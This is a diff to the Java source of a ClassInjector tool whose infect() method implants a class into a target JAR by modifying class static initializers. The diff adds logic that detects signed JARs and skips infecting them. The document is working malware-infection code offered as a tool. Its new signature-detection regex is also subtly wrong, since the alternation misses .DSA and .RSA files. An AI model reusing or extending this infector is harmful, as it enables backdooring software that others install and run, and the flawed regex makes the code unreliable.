@@ -6,8 +6,12 @@ import java.io.DataInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
+import java.nio.file.Files;
 import java.nio.file.Path;
+import java.nio.file.StandardCopyOption;
 import java.util.jar.JarEntry;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 import java.util.zip.ZipException;
 
 import static org.example.injector.Helpers.*;
@@ -22,16 +26,17 @@ public class ClassInjector {
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
         ClassFile implantedClass = null;
-        boolean foundSignedClasses = false;
+
+        if (jarLooksSigned(targetJarFilePath)) {
+            System.out.println("[-] JAR is signed. This is not yet implemented. Aborting.");
+            // Just copy the input JAR to the output JAR to keep up with expected behaviour
+            Files.copy(targetJarFilePath, outputJar, StandardCopyOption.REPLACE_EXISTING);
+            return false;
+        }
 
         try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
             for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                 if (!entry.getName().endsWith(".class")) {
-                    entry.forward();
-                    continue;
-                }
-                if (entry.getEntry().getCodeSigners() != null) {
-                    foundSignedClasses = true;
                     entry.forward();
                     continue;
                 }
@@ -78,10 +83,6 @@ public class ClassInjector {
                 modifyClinit(currentlyProcessing, implantedClass);
                 currentlyProcessing.write(entry.replaceContentByStream());
                 System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
-            }
-
-            if (foundSignedClasses) {
-                System.out.println("[-] Found signed classes. These were not considered for infection.");
             }
 
             return implantedClass != null;
@@ -154,5 +155,20 @@ public class ClassInjector {
             // compact() removes any "dead" items from the ConstPool. This modifies the class byte data quite a lot.
             classFile.compact();
         }
+    }
+
+    private boolean jarLooksSigned(Path jarFilePath) throws IOException {
+        Pattern regex = Pattern.compile("META-INF/.+\\.SF|DSA|RSA");
+
+        try (JarFileFiddler jar = JarFileFiddler.open(jarFilePath)) {
+            for (JarFileFiddler.WrappedJarEntry entry : jar) {
+                Matcher matcher = regex.matcher(entry.getName());
+                if (matcher.matches()) {
+                    return true;
+                }
+            }
+        }
+
+        return false;
     }
 }
